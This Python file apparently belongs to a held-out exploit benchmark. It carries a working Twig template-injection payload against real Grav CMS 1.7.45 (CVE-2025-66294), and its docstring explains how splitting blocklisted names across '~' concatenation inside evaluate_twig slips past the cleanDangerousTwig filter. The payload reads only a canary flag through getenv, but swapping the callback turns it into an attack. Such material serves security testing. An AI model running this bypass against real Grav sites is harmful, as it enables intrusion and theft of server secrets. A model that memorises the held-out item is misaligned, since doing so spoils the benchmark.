#!/usr/bin/env python3
"""[HELD-OUT] CVE-2025-66294 residual exploit -- the incomplete-fix bypass of Grav 1.7.45.
Runs against REAL Grav CMS (not a source-lifted harness).

CVE-2024-28116's fix (Grav 1.7.45) introduced Security::cleanDangerousTwig(): a SINGLE-PASS
regex that comments out any {{..}}/{%..%} block whose text literally contains a blocklisted word.
Its pattern is:

    /(({{\\s*|{%\\s*)[^}]*?(<blocklist>)[^}]*?(\\s*}}|\\s*%}))/i

The `[^}]*?` means the blocklisted word must appear inside ONE block with no '}' before it.
The V1 blocklist includes both `registerUndefinedFunctionCallback` and `twig.getFunction`.

This payload exploits the `evaluate_twig` nested-eval path (GHSA-662m-56v4-3r8f):

  1. The outer payload is {{ evaluate_twig( <inner twig built by ~ concatenation> ) }}.
     Both `registerUndefinedFunctionCallback` AND `twig.getFunction` (which matches
     `grav.twig.twig.getFunction`) are SPLIT across Twig '~' concatenated string
     literals, so neither appears contiguously in the outer string.
     `evaluate_twig` itself is NOT on the 1.7.45 blocklist.
     -> cleanDangerousTwig finds nothing to comment out; payload passes UNCHANGED.

  2. At render, Twig concatenates the fragments and calls evaluate_twig(inner).
     Grav's evaluateTwigFunc() creates a FRESH Twig\\Environment and renders `inner`
     without ever calling cleanDangerousTwig on it. The reconstructed
     `grav.twig.twig.registerUndefinedFunctionCallback('getenv')` runs, re-registering
     the callback on the main Grav Twig environment, and
     `grav.twig.twig.getFunction('PCB_FLAG')` resolves via getenv -> flag.

  V1 grav 1.7.45        : nested form survives the regex -> ESCAPE (residual)
  V2 grav 1.8.0-beta.27 : evaluate_twig added to blocklist + delimiter-independent
                           Pass 3 /\\b(evaluate_twig)\\s*\\(/i -> BLOCKED.

Benign canary only: the re-registered callback is the builtin `getenv`, reading the
per-run ${PCB_FLAG}.  No system(), no shell -- derived from the advisory + source diff.
"""

# NESTED form: registerUndefinedFunctionCallback AND twig.getFunction are both
# split by Twig ~ concatenation so V1's regex finds neither contiguously.
# grav.twig.twig = the real Twig\\Environment (Grav singleton's Twig service).
_PAYLOAD = (
    "{{ evaluate_twig("
    "'{{ grav.twig.' ~ 'twig.regist' ~ 'erUndefinedFunctionCallback(\"getenv\") }}"
    "{{ grav.twig.twig.get' ~ 'Function(\"PCB_FLAG\") }}'"
    ") }}"
)


def candidate():
    return {"payload": _PAYLOAD, "probe_id": "residual-cve-2025-66294-nested-evaluate_twig-reregister"}


if __name__ == "__main__":
    import json
    print(json.dumps(candidate(), indent=2))
